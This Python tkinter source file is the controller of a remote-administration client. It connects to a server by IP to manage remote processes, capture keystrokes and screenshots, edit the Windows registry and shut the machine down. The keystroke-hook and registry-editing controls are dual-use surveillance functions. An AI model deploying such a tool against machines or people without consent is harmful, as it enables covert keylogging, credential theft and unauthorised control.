import src.views.menu as mnu
import src.views.screenshot as ssh
import src.views.manager as mng
import src.views.keystroke as ksk
import src.views.registry as rgs
import src.views.utilities as utl
import src.model as msk
import tkinter as tk
import time


class Controller():
    def __init__(self, sock=None):
        super().__init__()
        self._root = tk.Tk()
        self._socket = msk.MySocket()
        # Bind event to the Menu window's buttons
        self._menu = mnu.Menu(self._root)
        self._menu.btn_connect.bind("<Button>", self.connect)
        self._menu.btn_process.bind("<Button>", self.manager_prc)
        self._menu.btn_app.bind("<Button>", self.manager_app)
        self._menu.btn_keystroke.bind("<Button>", self.keystroke)
        self._menu.btn_screenshot.bind("<Button>", self.screenshot)
        self._menu.btn_registry.bind("<Button>", self.registry)
        self._menu.btn_shutdown.bind("<Button>", self.shutdown)
        self._menu.btn_quit.bind("<Button>", self.exit_prog)
        self._menu.bind("<Destroy>", lambda e: self.exit_prog(
            event=e, isKilled=True))
        self._inputbox = [None] * 2
        self._function = None

    def run(self):
        self._menu.mainloop()

    def exit_prog(self, event, isKilled=False):
        try:
            self._socket.send("quit")
        except OSError:
            pass
        finally:
            self._socket.close()
            if not isKilled:
                self._root.destroy()

    def connect(self, event):
        ip = self._menu.etr_ip.get().strip("\n")
        if self._socket._isconnected:
            ans = tk.messagebox.askquestion(
                "New IP address", "Do you want to disconnect to the current server\n and reconnect to this IP ({})?".format(ip), icon="warning")
            if ans == "yes":
                try:
                    self._socket.send("quit")
                finally:
                    self._socket.close()
                    time.sleep(1)
            else:
                utl.messagebox("Client", "New connection cancelled", "error")
                return

        self._socket.connect(ip=ip)
        if self._socket._isconnected:
            utl.messagebox("Client", "Connected to the server", "info")
        else:
            utl.messagebox("Client", "Fail to connect to server", "error")

    # Function 1
    def manager_prc(self, event):
        try:
            if not self._function == None:
                return
            if not self._socket._isconnected:
                raise
            self._socket.send("process")
            self._function = mng.Manager(tk.Toplevel(self._root))
            # bindings...
            self._function.btn_kill.bind("<Button>", self.manager_prc_kill)
            self._function.btn_view.bind("<Button>", self.manager_prc_view)
            self._function.btn_start.bind("<Button>", self.manager_prc_start)
            self._function.bind(
                "<Destroy>", self.exit_func)
            # run window
            self._function.mainloop()
        except:
            utl.messagebox("Process", "Not connected to server", "warn")
            self._socket._isconnected = False

    def manager_prc_kill(self, event):
        if not self._inputbox[0] == None:
            return
        self._inputbox[0] = utl.inputbox(
            tk.Toplevel(self._function), tl="process", cmd="kill")
        # binding...
        self._inputbox[0].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=0, cmd="process", act="kill"))
        self._inputbox[0].bind(
            "<Destroy>", lambda e: self.reset_inputbox(event=e, boxid=0))
        self._inputbox[0].mainloop()

    def manager_prc_start(self, event):
        if not self._inputbox[1] == None:
            return
        self._inputbox[1] = utl.inputbox(
            tk.Toplevel(self._function), tl="process", cmd="start")
        # binding...
        self._inputbox[1].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=1, cmd="process", act="start"))
        self._inputbox[1].bind(
            "<Destroy>", lambda e: self.reset_inputbox(event=e, boxid=1))
        self._inputbox[1].mainloop()

    def manager_prc_view(self, event):
        self._socket.send("process,view")
        list_len = int(self._socket._sock.recv(32).decode('utf8'))
        data = self._socket.receive(length=list_len).decode("utf8")
        self._function.view(data)

    # Function 2
    def manager_app(self, event):
        try:
            if not self._function == None:
                return
            if not self._socket._isconnected:
                raise
            self._socket.send("application")
            self._function = mng.Manager(
                tk.Toplevel(self._root), "application")
            # bindings...
            self._function.btn_kill.bind("<Button>", self.manager_app_kill)
            self._function.btn_view.bind("<Button>", self.manager_app_view)
            self._function.btn_start.bind("<Button>", self.manager_app_start)
            self._function.bind(
                "<Destroy>", self.exit_func)
            # run window
            self._function.mainloop()
        except:
            utl.messagebox("Process", "Not connected to server", "warn")
            self._socket._isconnected = False

    def manager_app_kill(self, event):
        if not self._inputbox[0] == None:
            return
        self._inputbox[0] = utl.inputbox(tk.Toplevel(
            self._function), tl="application", cmd="kill")
        # binding...
        self._inputbox[0].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=0, cmd="application", act="kill"))
        self._inputbox[0].bind(
            "<Destroy>", lambda e: self.reset_inputbox(event=e, boxid=0))
        self._inputbox[0].mainloop()

    def manager_app_start(self, event):
        if not self._inputbox[1] == None:
            return
        self._inputbox[1] = utl.inputbox(tk.Toplevel(
            self._function), tl="application", cmd="start")
        # binding...
        self._inputbox[1].btn_get.bind("<Button>", lambda e: self.manip_runnin(
            event=e, boxid=1, cmd="application", act="start"))
        self._inputbox[1].bind(
            "<Destroy>", lambda e: self.reset_inputbox(event=e, boxid=1))
        self._inputbox[1].mainloop()

    def manager_app_view(self, event):
        self._socket.send("application,view")
        list_len = int(self._socket._sock.recv(32).decode("utf8"))
        data = self._socket.receive(length=list_len).decode("utf8")
        self._function.view(data)

    def manip_runnin(self, event, boxid, cmd, act):
        target = self._inputbox[boxid].getvalue()
        self._socket.send(','.join([cmd, act, target]))
        response = self._socket._sock.recv(32).decode("utf8")
        print(response)
        utl.messagebox(title=cmd, msg=response,
                       type="info" if response == "SUCCESS" else "error")

    # Function 3
    def keystroke(self, event):
        try:
            if not self._function == None:
                return
            if not self._socket._isconnected:
                raise
            self._socket.send("keystroke")
            self._function = ksk.Keystroke(tk.Toplevel(self._root))
            # bindings...
            self._function.btn_hook.bind("<Button>", self.keystroke_hook)
            self._function.btn_unhook.bind("<Button>", self.keystroke_unhook)
            self._function.btn_print.bind("<Button>", self.keystroke_print)
            self._function.btn_clear.bind("<Button>", self.keystroke_clear)
            self._function.bind(
                "<Destroy>", self.exit_func)
            # run window
            self._function.mainloop()
        except:
            utl.messagebox("Process", "Not connected to server", "warn")
            self._socket._isconnected = False

    def keystroke_hook(self, event):
        self._socket.send(','.join(["keystroke", "hook"]))

    def keystroke_unhook(self, event):
        self._socket.send(','.join(["keystroke", "unhook"]))

    def keystroke_print(self, event):
        self._socket.send("keystroke,print")
        log_len = int(self._socket._sock.recv(32).decode('utf8'))
        print(log_len)
        data = self._socket.receive(length=log_len).decode("utf8")
        print(data)
        self._function.print_keystroke(data)

    def keystroke_clear(self, event):
        self._function.text_field.configure(state="normal")
        self._function.text_field.delete("1.0", tk.END)
        self._function.text_field.configure(state="disable")

    # Function 4
    def screenshot(self, event):
        try:
            if not self._function == None:
                return
            if not self._socket._isconnected:
                raise
            self._socket.send("screenshot")
            self._function = ssh.Screenshot(tk.Toplevel(self._root))
            # bindings...
            self._function.btn_snap.bind("<Button>", self.screenshot_snap)
            self._function.btn_save.bind("<Button>", self.screenshot_save)
            self._function.bind(
                "<Destroy>", self.exit_func)
            self._function.mainloop()
        except:
            utl.messagebox("Process", "Not connected to server", "warn")
            self._socket._isconnected = False

    def screenshot_snap(self, event):
        # send
        self._socket.send("screenshot,snap")
        picture_len = int(self._socket._sock.recv(32).decode('utf8'))
        data = self._socket.receive(length=picture_len)
        self._function.update_image(data)

    def screenshot_save(self, event):
        self._function.save_image()

    # Function 5
    def registry(self, event):
        try:
            if not self._function == None:
                return
            if not self._socket._isconnected:
                raise
            self._socket.send("registry")
            self._function = rgs.Registry(tk.Toplevel(self._root))
            # bindings...
            self._function.btn_browse.bind("<Button>", self.registry_browse)
            self._function.btn_sendcont.bind(
                "<Button>", self.registry_sendcont)
            self._function.btn_send.bind("<Button>", self.registry_send)
            self._function.bind(
                "<Destroy>", self.exit_func)
            self._function.mainloop()
        except:
            utl.messagebox("Process", "Not connected to server", "warn")
            self._socket._isconnected = False

    def registry_browse(self, event):
        self._function.browse_path()

    def registry_sendcont(self, event):
        filecont = self._function._regcont
        self._socket.send(
            ','.join(["registry", "file"]))
        self._socket._sock.sendall(bytes(str(len(filecont)), "utf8"))
        time.sleep(0.1)
        self._socket.send(filecont)

        response = self._socket._sock.recv(1024).decode("utf8")
        utl.messagebox("Send regsitry file", response,
                       "info" if response == "SUCCESS" else "error")

    def registry_send(self, event):
        func = self._function._df_func.get().strip("\n")
        path = self._function.txt_path.get("1.0", tk.END).strip("\n")
        name = self._function.txt_name.get("1.0", tk.END).strip("\n")
        value = self._function.txt_value.get("1.0", tk.END).strip("\n")
        dttp = self._function._df_dttype.get().strip("\n")

        request = None
        if func in ['Get value', 'Set value', 'Create key']:
            func = func.split(" ", 1)[0].lower()
        else:
            func = func.replace(" ", "").lower()
        self._socket.send(
            ','.join(["registry", func, path, name, value, dttp]))

        response = self._socket._sock.recv(1024).decode("utf8")
        self._function.insert_result(response)

    # Function 6
    def shutdown(self, event):
        if not self._function == None:
            return
        if not self._socket._isconnected:
            utl.messagebox("Process", "Not connected to server", "warn")
            return
        self._socket.send("shutdown")
        self._socket.shutdown()

    # Window utilities methods
    def exit_func(self, event):
        self._socket.send("exit")
        self._function = None

    def reset_inputbox(self, event, boxid):
        self._inputbox[boxid].killbox()
        self._inputbox[boxid] = None
